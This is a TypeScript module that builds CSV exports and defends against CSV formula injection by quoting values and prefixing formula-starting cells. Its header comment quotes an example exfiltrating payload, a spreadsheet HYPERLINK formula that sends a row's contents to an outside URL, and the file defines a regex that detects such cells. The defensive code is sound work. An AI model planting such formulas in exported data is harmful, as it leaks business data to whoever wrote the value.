/**
 * The Insights export (P3-T4).
 *
 * A spreadsheet, not a report: the reason a business exports this is to put it
 * next to something we do not have — a rota, a supplier change, a refurbishment
 * date. So the file is one row per measurement with the raw numbers, not a
 * rendering of the page.
 *
 * Db-free and pure, so the escaping can be tested without a request.
 *
 * **Two escaping problems, and they are not the same one.**
 *
 * The first is CSV's own: a value containing a comma, a quote or a newline has
 * to be quoted and its quotes doubled, or the file silently gains a column and
 * every row after it is wrong. Review themes are model output in the customer's
 * own language and staff names are free text, so this is not hypothetical.
 *
 * The second is that spreadsheets execute cells. A value beginning `=`, `+`,
 * `-` or `@` is a formula to Excel, Sheets and LibreOffice, and
 * `=HYPERLINK("http://…"&A1)` in a theme tag would exfiltrate the row to
 * whoever wrote the review. That is CSV injection, it is a real attack against
 * exactly this shape of feature — untrusted text, exported by a business,
 * opened without thought — and the fix is to prefix such values with a single
 * quote so the cell is read as text.
 */

export type CsvRow = Record<string, string | number | null>;

/** Leading characters a spreadsheet treats as the start of a formula. */
const FORMULA_START = /^[=+\-@\t\r]/;

function cell(value: string | number | null): string {
  if (value === null) return "";
  if (typeof value === "number") return String(value);

  // Neutralised before quoting, so the guard survives the quoting rather than
  // being hidden by it.
  const safe = FORMULA_START.test(value) ? `'${value}` : value;

  return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}

/**
 * Rows → a CSV document.
 *
 * Columns come from the first row, so every row must carry the same keys; that
 * is a property of the callers here, all of which build rows from one mapper.
 *
 * `\r\n` line endings and a UTF-8 BOM, both for the same unglamorous reason:
 * Excel on Windows is where these files are opened, and without the BOM it
 * reads `Kadıköy` as `KadÄ±kÃ¶y`. The BOM is invisible to every other consumer.
 */
export function toCsv(rows: CsvRow[]): string {
  if (rows.length === 0) return "﻿";

  const columns = Object.keys(rows[0]!);
  const lines = [
    columns.map(cell).join(","),
    ...rows.map((row) => columns.map((column) => cell(row[column] ?? null)).join(",")),
  ];

  return `﻿${lines.join("\r\n")}\r\n`;
}

/**
 * A filename that says what is in it and when it was taken.
 *
 * Dated because these get downloaded repeatedly and end up in one folder, where
 * `insights.csv (3)` tells nobody anything.
 */
export function csvFilename(kind: string, range: string, now: Date): string {
  const day = now.toISOString().slice(0, 10);
  return `fairfame-${kind}-${range}-${day}.csv`;
}
